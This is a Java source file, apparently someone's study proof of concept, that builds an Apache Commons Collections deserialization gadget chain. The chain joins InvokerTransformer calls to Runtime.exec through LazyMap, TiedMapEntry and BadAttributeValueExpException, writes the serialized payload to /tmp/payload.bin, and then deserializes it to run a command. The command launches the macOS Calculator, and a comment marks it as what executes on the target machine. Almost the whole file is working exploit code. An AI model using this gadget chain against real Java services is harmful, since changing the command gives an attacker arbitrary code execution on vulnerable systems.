package JavaUnser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.annotation.Target;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import sun.reflect.annotation.*;

import javax.management.BadAttributeValueExpException;

/**
 * Hello world!
 *
 */
public class CommonCollections
{
    public static void main( String[] args ) throws Exception
    {
        /*
        //Transfomer用法
        Transformer tr=new InvokerTransformer(
                "append",
                new Class[]{String.class},
                new Object[]{"exploitcat?"}
        );
        Object newObject=tr.transform(new StringBuffer("your name is "));
        System.out.println(newObject);
         */
        //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                /*
                由于Method类的invoke(Object obj,Object args[])方法的定义
                所以在反射内写new Class[] {Object.class, Object[].class }
                正常POC流程举例：
                ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");
                */
                new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class },
                        new Object[] {"getRuntime", new Class[0] }
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class,Object[].class },
                        new Object[] {null, null }
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[] {String.class },
                        new Object[] { "/Applications/Calculator.app/Contents/MacOS/Calculator" } //目标机器上反序列化后执行的命令
                )
        };
        Transformer chainedTransformer=new ChainedTransformer(transformers);
        /*
        //测试map触发
        Map map=new HashMap();
        map.put("a","b");
        Map transformedMap=TransformedMap.decorate(map,null,chainedTransformer);
        transformedMap.put("a","z");
        System.exit(1);
        */

        /*
        Map orig=new HashMap<String,String>();
        orig.put("hello","hello");
        Map after=TransformedMap.decorate(orig,null,chainedTransformer);

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, after);
        */

        Map normalMap=new HashMap();
        normalMap.put("hackedby","imagemlt");
        Map lazyMap=LazyMap.decorate(normalMap,chainedTransformer);

        TiedMapEntry entry=new TiedMapEntry(lazyMap,"foo");

        BadAttributeValueExpException instance=new BadAttributeValueExpException(null);
        Field valField=instance.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(instance,entry);

        File f=new File("/tmp/payload.bin");
        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();

        ObjectInputStream in=new ObjectInputStream(new FileInputStream(f));
        Object obj=in.readObject();
        System.out.println("got obj");
    }
}
